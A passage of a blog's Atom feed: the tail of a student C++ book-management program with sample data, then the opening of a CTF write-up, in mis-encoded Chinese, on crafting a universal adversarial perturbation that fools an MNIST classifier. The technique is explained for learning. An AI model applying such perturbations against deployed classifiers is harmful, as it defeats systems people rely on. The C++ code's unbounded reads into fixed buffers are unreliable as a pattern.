class="built_in">memcpy</span>(p-&gt;name, newName, nameSize);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> newAuthor[<span class="number">64</span>];</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input new author : &quot;</span>;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; newAuthor;</span><br><span class="line">            <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; newAuthor &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">free</span>(p-&gt;author);</span><br><span class="line">            p-&gt;authorLen = <span class="built_in">strlen</span>(newAuthor);</span><br><span class="line">            <span class="keyword">int</span> authorSize = <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (p-&gt;authorLen + <span class="number">1</span>);</span><br><span class="line">            p-&gt;author = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(authorSize);</span><br><span class="line">            <span class="built_in">memcpy</span>(p-&gt;author, newAuthor, authorSize);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="number">5</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            AlertWrongInput();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteBook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- Deleting Book&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    ViewAllBooks(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Delete book at index of : &quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; index;</span><br><span class="line">    <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; index &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    DeleteNode(head, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SearchInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- Searching Info&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- 1.name  2.author&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Search by : &quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> input;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; input;</span><br><span class="line">    <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; input &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> wantedName[<span class="number">64</span>];</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input wanted name : &quot;</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; wantedName;</span><br><span class="line">        <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; wantedName &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        SLNode p = head-&gt;next;</span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(p-&gt;name, wantedName))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (cnt == <span class="number">0</span>)</span><br><span class="line">                    PrintInfoTitle();</span><br><span class="line">                PrintInfo(cnt++, p);</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (input == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> wantedAuthor[<span class="number">64</span>];</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Input wanted author : &quot;</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; wantedAuthor;</span><br><span class="line">        <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; wantedAuthor &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        SLNode p = head-&gt;next;</span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(p-&gt;author, wantedAuthor))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (cnt == <span class="number">0</span>)</span><br><span class="line">                    PrintInfoTitle();</span><br><span class="line">                PrintInfo(cnt++, p);</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        AlertWrongInput();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LoadMainMenu</span><span class="params">(<span class="keyword">bool</span> bFile)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    inputFromFile = bFile;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; fixed &lt;&lt; setprecision(<span class="number">2</span>);</span><br><span class="line">    Initiate(&amp;head);</span><br><span class="line">    LoadData();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;* ====================\n* 1. Add New Book\n* 2. Edit Info\n* 3. Delete Book\n* 4. Search Book\n* 5. View All Books\n* 6. Save Data\n* 7. Save And Exit\n* ====================&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">int</span> input;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&gt;&gt; Select a function : &quot;</span>;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; input;</span><br><span class="line">            <span class="keyword">if</span> (inputFromFile)</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; input &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">if</span> (input &gt; <span class="number">0</span> &amp;&amp; input &lt; <span class="number">8</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;# ERROR: Input not a number in range of 1~7, please retry&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (input)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            AddNewBook();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            EditInfo();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            DeleteBook();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            SearchInfo();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            ViewAllBooks(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            SaveData();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            SaveData();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            AlertWrongInput();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        main.cpp    </div>    <div class='spoiler-content'>        <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;LibFunc.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">ifstream <span class="title">iFile</span><span class="params">(<span class="string">&quot;input.txt&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">bool</span> inputFromFile = iFile.good();</span><br><span class="line">    <span class="keyword">if</span> (iFile.good())</span><br><span class="line">    &#123;</span><br><span class="line">        freopen(<span class="string">&quot;input.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        freopen(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="built_in">stdout</span>);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;* Input From File&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;* Input From User&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    iFile.close();</span><br><span class="line">    LoadMainMenu(inputFromFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><h2 id="Sample"><a href="#Sample" class="headerlink" title="Sample"></a>Sample</h2><div class='spoiler collapsed'>    <div class='spoiler-title'>        data.txt    </div>    <div class='spoiler-content'>        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">6</span><br><span class="line">    1    233                             wow                             kyr</span><br><span class="line">    3     69                            Test                         tAuthor</span><br><span class="line">    4  34.98                      HelloWorld                             lol</span><br><span class="line">   10  19.42                            bass                            drum</span><br><span class="line">    3    3.8                         English                             edu</span><br><span class="line">    2     13                      Dcitionary                             edu</span><br><span class="line"></span><br></pre></td></tr></table></figure>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        input.txt    </div>    <div class='spoiler-content'>        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">1</span><br><span class="line">12</span><br><span class="line">514.5</span><br><span class="line">Xmas</span><br><span class="line">Mr.Joe</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">1</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">3</span><br><span class="line">7</span><br><span class="line">5</span><br><span class="line">4</span><br><span class="line">2</span><br><span class="line">edu</span><br><span class="line">7</span><br></pre></td></tr></table></figure>    </div></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸€æ—©ä¸Šå°±èƒ½å†™å®Œï¼Œæœ‰éœ€è¦çš„è‡ªå·±æ‹¿å»æ”¹ï¼Œä¸è¦å®Œå…¨æ¬å°±è¡Œ&lt;/p&gt;</summary>
    
    
    
    <category term="è¯¾å†…" scheme="https://kyriota.github.io/categories/%E8%AF%BE%E5%86%85/"/>
    
    
  </entry>
  
  <entry>
    <title>è¥¿æ¹–è®ºå‰‘GlobalNoise[AIå¯¹æŠ—å¯è’™]</title>
    <link href="https://kyriota.github.io/2021/11/25/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91GlobalNoise[AI%E5%AF%B9%E6%8A%97%E5%90%AF%E8%92%99]/"/>
    <id>https://kyriota.github.io/2021/11/25/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91GlobalNoise[AI%E5%AF%B9%E6%8A%97%E5%90%AF%E8%92%99]/</id>
    <published>2021-11-25T07:15:15.000Z</published>
    <updated>2022-05-08T06:44:51.147Z</updated>
    
    <content type="html"><![CDATA[<p>è¿‘æœŸCTFèµ›äº‹é‡Œé¢AIå¯¹æŠ—é¢˜å‡ºç°é¢‘ç‡é€æ¸å‡é«˜ï¼Œä½œä¸ºä¸€ä¸ªæ‘¸äº†å¥½ä¹…çš„webäººï¼Œæ­£å¥½ä¹‹å‰è‡ªå·±æœ‰ä¸€ç‚¹MachineLearningçš„åŸºç¡€ï¼Œå‡†å¤‡å°è¯•ä¸€ä¸‹è¿™ä¸ªé¢†åŸŸ</p><p><img src="/images/GlobalNoise_Universal.png"></p><span id="more"></span><!--toc--><h1 id="è¥¿æ¹–è®ºå‰‘GlobalNoise-AIå¯¹æŠ—å¯è’™"><a href="#è¥¿æ¹–è®ºå‰‘GlobalNoise-AIå¯¹æŠ—å¯è’™" class="headerlink" title="è¥¿æ¹–è®ºå‰‘GlobalNoise[AIå¯¹æŠ—å¯è’™]"></a>è¥¿æ¹–è®ºå‰‘GlobalNoise[AIå¯¹æŠ—å¯è’™]</h1><blockquote><p>2022/01/16è¡¥å……ï¼šå‘äº†å…³äº<a href="https://kyriota.com/2022/01/16/%E5%85%A8%E8%BF%9E%E6%8E%A5%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C[%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%A5%E9%97%A8]/">å…¨è¿æ¥ç¥ç»ç½‘ç»œçš„æ–‡ç« </a>ï¼Œæ‰‹æ“äº†ä¸€ä¸ªæ¨¡å‹ä¹‹åå†å›æ¥çœ‹è¿™ç¯‡æ–‡ç« ï¼Œå‘ç°å¾ˆå¤šåœ°æ–¹æœ‰å¤±åé¢‡(å·²åŸºæœ¬ä¿®æ­£)ï¼Œæ­£å¥½ä¹‹å‰æœ‰ä¸€ä¸ªæƒ³æŠŠæ ·æœ¬åç§»åˆ°ä»»æ„classçš„å¿ƒæ„¿æ²¡æœ‰å®Œæˆï¼Œåç»­ä¼šå‘ä¸€ç¯‡æ–°çš„æ–‡ç« <a href="https://kyriota.com/2022/04/09/L2_Targeted_Attack/">L2 Targeted Attack</a></p></blockquote><p>æœ¬æ–‡é¢å‘çš„å¯¹è±¡æ˜¯ï¼š</p><ul><li>å¯¹Machine LearningåŸç†æœ‰åŸºæœ¬ç†è§£çš„å…¥é—¨AIäºº</li><li>åƒç“œç¾¤ä¼—</li></ul><p>ï¼ˆæœºå™¨å­¦ä¹ ç›¸å…³çš„å‰ç½®çŸ¥è¯†å»ºè®®çœ‹å´æ©è¾¾ï¼Œç„¶åä¸è°ƒåº“è‡ªå·±å†™ä¸€ç‚¹é€»è¾‘å›å½’çº¿æ€§å›å½’çš„åŸºæœ¬åˆ†ç±»å™¨å°±å¤Ÿäº†ï¼ˆè‡³å°‘æˆ‘åœ¨è¿™ä¹‹å‰åªæœ‰è¿™ç‚¹åŸºç¡€ï¼ŒæŠ€æœ¯æ‹‰è·¨</p><h2 id="é¢˜é¢"><a href="#é¢˜é¢" class="headerlink" title="é¢˜é¢"></a>é¢˜é¢</h2><p>æ¦‚è¿°ï¼šæä¾›äº†ä¸€ä¸ªè®­ç»ƒå¥½çš„modelå’Œä¸€ä»½mnistæ•°æ®é›†ï¼Œè¦æ±‚å¯¹å…¶ä¸­çš„100ä»½æ ·æœ¬è¿›è¡Œä¸€ä¸ªå…¨å±€æ€§çš„è¾ƒå°æ‰°åŠ¨ï¼ˆå¯¹å‘é‡çš„èŒƒæ•°è¿›è¡Œäº†é™åˆ¶ï¼‰ï¼Œä½¿å¾—è¿™100ä»½æ ·æœ¬çš„åˆ†ç±»æ­£ç¡®ç‡ä½äº5%</p><p><a href="https://kyriota.com/html/DLfiles/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91GlobalNoise.zip">ä¸‹è½½é“¾æ¥(githubæº)</a></p><p>ï¼ˆå½“æ—¶æ²¡æœ‰å­˜é¢˜é¢å•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šï¼Œå¹¶éå®Œæ•´åŸé¢˜ï¼Œåªæ˜¯æˆ‘æ ¹æ®å›å¿†å’Œéœ€è¦çš„æ¡ä»¶æ‘¸å‡ºæ¥çš„ä¸€ä¸ªé¢˜é¢</p><h3 id="é¢˜é¢åˆ†æ"><a href="#é¢˜é¢åˆ†æ" class="headerlink" title="é¢˜é¢åˆ†æ"></a>é¢˜é¢åˆ†æ</h3><p>å°†é¢˜ç›®ç»™å‡ºçš„100ä¸ªæ ·æœ¬è¿‡ä¸€ä¸ªç›®ä¼šå‘ç°æ˜¯7å’Œ9çš„______</p><p><img src="/images/GlobalNoise_testSet.png"></p><p>å¦‚æœä½ æƒ³çš„æ˜¯<code>äºŒåˆ†ç±»</code>å°±ä¸å¯¹äº†ï¼Œå› ä¸ºæ˜¯ä¸å¯èƒ½ç”¨ä¸€ä¸ªå™ªéŸ³æŠŠå¤§éƒ¨åˆ†7ç³Šå¼„åˆ°9ï¼Œç„¶åæŠŠå¤§éƒ¨åˆ†9ç³Šå¼„åˆ°7çš„ï¼ˆå¥½å¤šäººä¸€çœ‹åˆ°éƒ½è¯´äºŒåˆ†ç±»</p><p>æœ¬æ¥å°±æ˜¯æœ‰10ä¸ªç±»åˆ«ï¼ˆ0~9ï¼‰ï¼Œå¯ä»¥æŠŠ9å’Œ7ç³Šå¼„åˆ°é™¤ä»–ä¿©ä¹‹å¤–çš„classesé‡Œé¢å»</p><p>æ­¤é¢˜å¾ˆæ˜æ˜¾å…³é”®åœ¨äºGlobalï¼Œä¹Ÿæ­£æ˜¯è¿™ä¸ªGlobalå’Œå¯¹èŒƒæ•°çš„é™åˆ¶æ‹¦ä½äº†å¾ˆå¤šåƒæˆ‘è¿™æ ·çš„åŠåŠå­</p><blockquote><p>ä¹‹å‰åšè¿‡0CTF-finalä¸­çš„boyNextDoorï¼Œæ˜¯ä¸€ä¸ªäººè„¸è¯†åˆ«çš„é¢˜ï¼Œæ­£è§£æ˜¯ç”¨æ¢¯åº¦æ„é€ noiseï¼Œè¿˜éœ€è¦Expectation over Transformation (EOT) æ¥ç»•è¿‡dlibçš„éšæœºæŠ–åŠ¨ï¼Œå½“æ—¶å±äºæ˜¯æ— çŸ¥è€…æ— ç•ï¼Œç›´æ¥éšæœºæ”¹å•åƒç´ ç»™çˆ†å‡ºæ¥äº†ï¼Œç”±äºåªéœ€è¦æ„é€ äººè„¸å›¾ç‰‡ï¼Œæ‰€ä»¥å¯¹äºå™ªéŸ³èŒƒæ•°å’Œå™ªéŸ³é²æ£’æ€§æ²¡æœ‰è¦æ±‚ï¼Œåªè¦ä»–èƒ½è¯†åˆ«åˆ°äººè„¸ä½ç½®å³å¯</p></blockquote><p>ä½†æ˜¯å½“æˆ‘æƒ³åœ¨è¿™ä¸ªé¢˜ç”¨åŠåŠå­æ‰‹æ³•å»è§£å†³æ—¶ï¼Œå¾ˆæ˜æ˜¾åœ¨èŒƒæ•°é™åˆ¶å’Œé²æ£’æ€§ä¸Šéƒ½é‡åˆ°äº†é—®é¢˜ï¼Œé€šå¸¸æ¥è¯´æ ¹æ®æ¢¯åº¦æ„é€ çš„å™ªéŸ³ä¼šæ¯”æ»¡è¶³æ¡ä»¶çš„éšæœºå™ªéŸ³çš„L2(æ¨¡é•¿)å°10~100å€ï¼Œè€Œä¸”éšæœºå™ªéŸ³åªå¯¹å•ä¸ªæ ·æœ¬æœ‰æ•ˆï¼Œå®Œå…¨ä¸èƒ½Global</p><p>æ‰€ä»¥äººè¿˜æ˜¯è¦è¿›æ­¥ï¼Œå¿…é¡»å¾—ç†è§£æ­£ç¡®æ„é€ å™ªéŸ³çš„æ–¹æ³•</p><h2 id="ä¸€ç¯‡è®ºæ–‡"><a href="#ä¸€ç¯‡è®ºæ–‡" class="headerlink" title="ä¸€ç¯‡è®ºæ–‡"></a>ä¸€ç¯‡è®ºæ–‡</h2><p>è¿™æ˜¯ä¸€ç¯‡å…³äºå…¨å±€æ‰°åŠ¨çš„<a href="https://arxiv.org/pdf/2005.08087.pdf">æ–‡ç« </a>ï¼Œçœ‹ä¸€åŠå¤§æ¦‚å°±èƒ½çŸ¥é“æ„é€ å…¨å±€æ‰°åŠ¨çš„åŸç†äº†ï¼Œå…¶å®ä¹Ÿqsä¸éš¾ç†è§£ï¼Œä½†å¯èƒ½éœ€è¦å…ˆç†è§£æ¨¡å‹çš„è®­ç»ƒè¿‡ç¨‹ä»¥åŠä½¿ç”¨</p><ul><li><p>åœ¨è®­ç»ƒæ—¶ï¼šè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯åœ¨å¯»æ‰¾ä¸€ä¸ªæœ€ä¼˜çš„ çº¿æ€§(oréçº¿æ€§?) çš„å˜æ¢ï¼Œä½¿å¾—è¾“å…¥ç»è¿‡è¿™ä¸ªå˜æ¢ä¹‹åèƒ½å¤Ÿè½åˆ°é›†ä¸­çš„ä½ç½®ï¼Œè¿™æ ·å°±å¯ä»¥æ ¹æ®ä¸€äº›ç•Œé™(å†³ç­–è¾¹ç•Œ)æ¥åˆ’åˆ†çš„è¾“å…¥ï¼Œå¹¶ç»™å‡ºæ¨¡å‹çš„åˆ¤æ–­</p></li><li><p>åœ¨é¢„æµ‹æ—¶ï¼šè¾“å…¥/æ•°æ® äº¤ç»™ä¸€ä¸ªè®­ç»ƒå¥½çš„æ¨¡å‹è¿›è¡Œåˆ†ç±»çš„æ—¶å€™ï¼Œå…¶å®ä¹Ÿå°±è¿›è¡Œäº†ä¸€ä¸ªæ˜ å°„ï¼Œæ¯”å¦‚æ­¤å¤„çš„mnistæ•°æ®é›†æ˜¯28x28çš„å›¾ç‰‡ï¼Œé‚£å…¶å®å°±æ˜¯é•¿åº¦ä¸º784çš„å‘é‡ï¼Œå‡è®¾æ¨¡å‹æ˜¯fï¼Œé‚£ä¹ˆf(x)å°±æ˜¯æ¨¡å‹å¯¹è¾“å…¥å‘é‡xé¢„æµ‹çš„åˆ†ç±»ç»“æœ</p></li><li><p>å†³ç­–è¾¹ç•Œï¼šå…¶å®åœ¨æˆ‘ä¸ªäººç›®å‰çš„ç†è§£ä¸­ï¼Œå†³ç­–è¾¹ç•Œå…¶å®å°±æŒ‡</p><blockquote><p>åœ¨è¿™ä¸ªé—­åˆçš„è¾¹ç•Œå†…ï¼Œæ‰€æœ‰è½åˆ°è¿™é‡Œé¢çš„f(x)éƒ½ä¼šè¢«åˆ¤å®šä¸ºæŸä¸€ä¸ªåˆ†ç±»</p></blockquote></li></ul><p>æ‰€ä»¥ç°åœ¨å†å›æ¥çœ‹æ–‡ä¸­çš„å›¾ï¼š</p><p><img src="/images/GlobalNoise_Universal.png"></p><p>ä»–æè¿°çš„å…¶å®å°±æ˜¯ï¼š</p><ul><li>åœ¨çº¢ï¼Œç»¿ï¼Œè“ï¼Œä¸‰ä¸ªå†³ç­–è¾¹ç•Œå†…ï¼ˆäºŒç»´æ‰å¹³åŒ–çš„å†³ç­–ç©ºé—´åªæ˜¯ä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºå’Œç†è§£ï¼‰ï¼Œåˆ†åˆ«æœ‰ä¸‰ä¸ªæ ·ç‚¹x1ï¼ˆåœ¨çº¢è‰²è¾¹ç•Œå†…ï¼‰,x2ï¼ˆåœ¨è“è‰²è¾¹ç•Œå†…ï¼‰,x3ï¼ˆåœ¨ç»¿è‰²è¾¹ç•Œå†…ï¼‰</li><li>ä¸ºäº†è§†è§‰ä¸Šæ–¹ä¾¿ç†è§£ï¼ŒæŠŠè¿™ä¸‰ä¸ªç‚¹ä»¥åŠä»–ä»¬çš„å†³ç­–ç©ºé—´é‡åˆåœ¨ä¸€èµ·ï¼ˆåŸæœ¬çš„å†³ç­–ç©ºé—´ç»ä¸€èˆ¬ä¸ä¼šç›¸äº’é‡å ï¼Œå› ä¸ºè¾¹ç•Œä¸Šæ­£æ˜¯é¢„æµ‹ç»“æœæ”¹å˜çš„ä¸´ç•Œå¤„ï¼Œå¦‚æœæœ‰ä¸€ä¸ªæ¨¡å‹å­˜åœ¨å¤ªå¤šè¿™æ ·çš„ä¸´ç•ŒçŠ¶å†µï¼Œé‚£è¯´æ˜ä»–è¿™ä¸ªæ¨¡å‹ä¸å¤ªè¡Œï¼‰</li><li>å¯¹f(x)ï¼Œä½¿ç”¨æ¢¯åº¦ä¸‹é™æ³•ï¼Œè·å–ä¸€ä¸ªnoiseï¼Œè¿™ä¸ªnoiseå¯ä»¥æœ€å¿«åœ°æŠŠx1é€åˆ°çº¢è‰²çš„å†³ç­–è¾¹ç•Œ</li><li>è¿™æ—¶noiseå¯ä»¥æŠŠåŸæœ¬è½åœ¨çº¢è‰²è¿™ä¸ªå†³ç­–ç©ºé—´å†…çš„x1ç›´æ¥é€å‡ºåˆ°å†³ç­–è¾¹ç•Œå¤–å»ï¼Œä½†å¯¹äºè“è‰²å†³ç­–ç©ºé—´ä¸­çš„x2æ¥è¯´åˆ™ä¸å¤ªå¥½è¯´</li><li>æ•…é‡å¤è¿™ä¸€è¿‡ç¨‹ï¼Œä½†x2åº”æ›´æ–°ä¸º<code>x2+=noise</code>ï¼Œå¯¹æ›´æ–°åçš„x2æ±‚ä¸€ä¸ªèƒ½æŠŠx2é€å‡ºå†³ç­–è¾¹ç•Œçš„æ–°noiseï¼Œç„¶åæ›´æ–°noiseä¸º<code>noise+=newNoise</code></li><li>å¯¹x3é‡å¤è¿™ä¸€è¿‡ç¨‹</li></ul><p>è¿™æ ·å°±è·å¾—äº†ä¸€ä¸ªå¯ä»¥æŠŠx1,x2,x3éƒ½é€å‡ºå†³ç­–ç©ºé—´çš„å™ªéŸ³ï¼ˆå½“ç„¶ï¼Œæ±‚è¿™ä¸ªå™ªéŸ³çš„é¡ºåºä¼šå¯¹æœ€ç»ˆå¾—åˆ°çš„å™ªéŸ³æœ‰å½±å“</p><h2 id="å…·ä½“å®ç°"><a href="#å…·ä½“å®ç°" class="headerlink" title="å…·ä½“å®ç°"></a>å…·ä½“å®ç°</h2><h3 id="é¢„å¤„ç†"><a href="#é¢„å¤„ç†" class="headerlink" title="é¢„å¤„ç†"></a>é¢„å¤„ç†</h3><p>åŸé¢˜ä¸­çš„é¢„å¤„ç†æ˜¯è°ƒåº“ç›´æ¥ç”¨çš„æ¥å£ï¼Œæˆ‘å› ä¸ºæ²¡æœ‰æ¥è§¦è¿‡å¤ªå¤šæœºå™¨å­¦ä¹ çš„åº“æ‰€ä»¥æ‰‹åŠ¨å¤„ç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> tensorflow <span 